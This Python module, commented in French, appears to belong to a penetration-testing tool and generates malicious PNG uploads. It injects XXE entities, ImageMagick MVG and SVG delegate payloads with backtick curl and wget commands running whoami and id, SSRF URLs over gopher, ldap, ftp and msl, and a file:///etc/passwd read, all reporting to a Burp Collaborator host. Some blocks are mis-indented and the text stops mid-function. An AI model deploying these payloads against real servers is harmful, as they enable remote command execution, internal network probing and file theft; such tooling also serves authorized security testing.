from pathlib import Path
from PIL import Image
import struct
import zlib

try:
    from .payload_generator import (
        generate_ysoserial_for_jpeg, generate_phpggc_for_png_text, generate_phpggc_for_jpeg_exif,
        generate_ysoserial_net_for_jpeg, generate_python_pickle_for_png, generate_python_yaml_for_png,
        generate_ruby_marshal_for_png, generate_ruby_yaml_for_png, generate_nodejs_serialize_for_png,
        generate_ssti_payload,
        generate_ysoserial_all_for_jpeg, generate_phpggc_all_for_png_text, generate_phpggc_all_for_jpeg_exif,
        generate_ysoserial_net_all_for_jpeg,
        list_ysoserial_gadgets, list_phpggc_gadgets, list_ysoserial_net_formatters
    )
    PAYLOAD_GENERATOR_AVAILABLE = True
except ImportError:
    try:
        from payload_generator import (
            generate_ysoserial_for_jpeg, generate_phpggc_for_png_text, generate_phpggc_for_jpeg_exif,
            generate_ysoserial_net_for_jpeg, generate_python_pickle_for_png, generate_python_yaml_for_png,
            generate_ruby_marshal_for_png, generate_ruby_yaml_for_png, generate_nodejs_serialize_for_png,
            generate_ssti_payload,
            generate_ysoserial_all_for_jpeg, generate_phpggc_all_for_png_text, generate_phpggc_all_for_jpeg_exif,
            generate_ysoserial_net_all_for_jpeg,
            list_ysoserial_gadgets, list_phpggc_gadgets, list_ysoserial_net_formatters
        )
        PAYLOAD_GENERATOR_AVAILABLE = True
    except ImportError:
        PAYLOAD_GENERATOR_AVAILABLE = False

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_image_payloads(output_dir, ext, burp_collab, tech_filter='all', payload_types=None):
    """
    Génère des payloads d'images
    
    Args:
        output_dir: Répertoire de sortie
        ext: Extension ('png', 'jpg', 'gif')
        burp_collab: URL Burp Collaborator
        tech_filter: Filtre backend ('all', 'java', 'php', 'python', 'ruby', 'dotnet', 'nodejs')
        payload_types: Set de types de payloads à générer (None ou {'all'} = tous)
    """
    if payload_types is None:
        payload_types = {'all'}
    
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    def should_generate(backend_tags):
        """Vérifie si le payload doit être généré selon le filtre"""
        if tech_filter == 'all':
            return True
        if tech_filter in backend_tags:
            return True
        return False
    
    def should_generate_type(payload_type):
        """Vérifie si le type de payload doit être généré"""
        return 'all' in payload_types or payload_type in payload_types
    
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    
    if ext == 'png':
        img = Image.new('RGB', (100, 100), color='red')
        
        # SSRF1: SSRF via PNG iTXt chunk avec URL dans XMP metadata
        # BACKEND: all (fonctionne sur tous les backends qui parsent XMP)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-png lors du parsing XMP
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf1_itxt.png"
            img.save(img_path, 'PNG')
            
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE1: XXE dans PNG iTXt chunk avec XMP et DOCTYPE entity
        # BACKEND: all (fonctionne sur tous les backends qui parsent XML)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP vers base_url/xxe-png lors du parsing XML
        # Le parser XML va résoudre l'entité externe %x qui fait une requête HTTP
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe1_itxt.png"
            img.save(img_path, 'PNG')
            
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        if should_generate(['all']):
            img_path = output_dir / "master.png"
            img.save(img_path, 'PNG')
            
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE1: ImageMagick MVG delegate avec command execution dans url()
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers https://burp_collab/rce-imagemagick avec paramètre contenant la sortie de curl
        # Le backtick `curl ...` exécute la commande et injecte le résultat dans l'URL
        # Vérifier dans Burp Collaborator: requête reçue avec le résultat de curl dans le paramètre
        # Alternative: utiliser curl avec header pour reflection: curl -H "X-RCE-Proof: $(whoami)" burp_collab
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce1_imagemagick.png"
            img.save(img_path, 'PNG')
            
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            exploit_payload = f'''push graphic-context
viewbox 0 0 640 480
fill \'url(https://{burp_collab}/rce-imagemagick?`curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-imagemagick`)'
pop graphic-context'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{exploit_payload.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE2: ImageMagick SVG delegate avec command execution via xlink:href
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers https://burp_collab/rce-delegate avec paramètre contenant la sortie de wget
        # Le backtick `wget ...` exécute la commande et injecte le résultat dans l'URL
        # Vérifier dans Burp Collaborator: requête reçue avec le résultat de wget dans le paramètre
        # Alternative: utiliser wget avec header pour reflection: wget --header="X-RCE-Proof: $(id)" burp_collab
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce2_imagemagick_delegate.png"
            img.save(img_path, 'PNG')
            
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            exploit_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget --header="X-RCE-Proof: $(id)" {base_url}/rce-delegate`" width="100" height="100"/>
</svg>'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{exploit_svg.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        img_path = output_dir / "master2_rce.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        exploit_payload = f'''push graphic-context
viewbox 0 0 640 480
fill \'url(https://{burp_collab}/rce-imagemagick?`curl {base_url}/rce-imagemagick`)'
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{exploit_payload.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        exploit_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget {base_url}/rce-delegate`" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk2 = f'ImageMagick\x00\x00{exploit_svg.decode()}'.encode('utf-8')
        iTXt_length2 = struct.pack('>I', len(iTXt_chunk2))
        iTXt_type2 = b'iTXt'
        iTXt_crc2 = struct.pack('>I', 0x12345679)
        
        iend_pos2 = png_data.rfind(b'IEND')
        if iend_pos2 != -1:
            iend_chunk_start2 = iend_pos2 - 4
            new_chunk2 = iTXt_length2 + iTXt_type2 + iTXt_chunk2 + iTXt_crc2
            png_data[iend_chunk_start2:iend_chunk_start2] = new_chunk2
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF2: ImageMagick MVG avec url() delegate (https)
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers https://burp_collab/ssrf-mvg depuis le serveur
        # ImageMagick va faire une requête HTTP pour récupérer l'URL dans fill url()
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf2_mvg_url.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_mvg = f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/ssrf-mvg)
pop graphic-context'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_mvg.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF3: SSRF via MVG with http:// delegate
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête http pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf3_mvg_http.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_mvg_http = f'''push graphic-context
viewbox 0 0 640 480
fill url(http://{burp_collab}/ssrf-mvg-http)
pop graphic-context'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_mvg_http.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 4: MVG with ftp:// delegate
        # SSRF: ssrf4_mvg_ftp.png - Server-Side Request Forgery via ImageMagick ftp delegate
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête ftp pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf4_mvg_ftp.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_ftp = f'''push graphic-context
viewbox 0 0 640 480
fill url(ftp://{burp_collab}/ssrf-ftp)
pop graphic-context'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_ftp.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 5: SVG with https xlink:href
        # SSRF: ssrf5_svg_https.png - Server-Side Request Forgery via ImageMagick https delegate
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête https pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf5_svg_https.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_svg_https = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/ssrf-svg-https" width="100" height="100"/>
</svg>'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_https.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 6: SVG with http xlink:href
        # SSRF: ssrf6_svg_http.png - Server-Side Request Forgery via ImageMagick http delegate
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête http pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf6_svg_http.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_svg_http = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="http://{burp_collab}/ssrf-svg-http" width="100" height="100"/>
</svg>'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_http.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 7: SVG with ftp xlink:href
        # SSRF: ssrf7_svg_ftp.png - Server-Side Request Forgery via ImageMagick ftp delegate
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête ftp pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf7_svg_ftp.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_svg_ftp = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="ftp://{burp_collab}/ssrf-svg-ftp" width="100" height="100"/>
</svg>'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_ftp.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 8: MVG with gopher:// delegate
        # SSRF: ssrf8_mvg_gopher.png - Server-Side Request Forgery via ImageMagick gopher delegate
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête gopher pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf8_mvg_gopher.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_gopher = f'''push graphic-context
viewbox 0 0 640 480
fill url(gopher://{burp_collab}/ssrf-gopher)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_gopher.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 9: MVG with ldap:// delegate
        # SSRF: ssrf9_mvg_ldap.png - Server-Side Request Forgery via ImageMagick ldap delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête ldap pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf9_mvg_ldap.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_ldap = f'''push graphic-context
viewbox 0 0 640 480
fill url(ldap://{burp_collab}/ssrf-ldap)
pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_ldap.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 10: MVG with file:// delegate (local SSRF)
        # SSRF: ssrf10_mvg_file.png - Server-Side Request Forgery via ImageMagick file delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête file pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf10_mvg_file.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_file = f'''push graphic-context
viewbox 0 0 640 480
fill url(file:///etc/passwd)
pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_file.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 11: MVG with image over and https
        # SSRF: ssrf11_mvg_image_https.png - Server-Side Request Forgery via ImageMagick https delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête https pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf11_mvg_image_https.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            ssrf_image_https = f'''push graphic-context
image over 0,0 0,0 "https://{burp_collab}/ssrf-image-https"
pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_image_https.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 12: MVG with image over and http
        # SSRF: ssrf12_mvg_image_http.png - Server-Side Request Forgery via ImageMagick http delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête http pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf12_mvg_image_http.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_image_http = f'''push graphic-context
            image over 0,0 0,0 "http://{burp_collab}/ssrf-image-http"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_image_http.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 13: SVG with embedded image and xlink
        # SSRF: ssrf13_svg_embedded.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf13_svg_embedded.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_svg_embedded = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <defs>
            <image xlink:href="https://{burp_collab}/ssrf-svg-embedded" id="img1"/>
            </defs>
            <use xlink:href="#img1"/>
            </svg>'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_embedded.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 14: MVG with msl: delegate
        # SSRF: ssrf14_mvg_msl.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf14_mvg_msl.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_msl = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/ssrf-msl\\" /></image>"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_msl.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 15: MVG with epi: delegate
        # SSRF: ssrf15_mvg_epi.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf15_mvg_epi.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
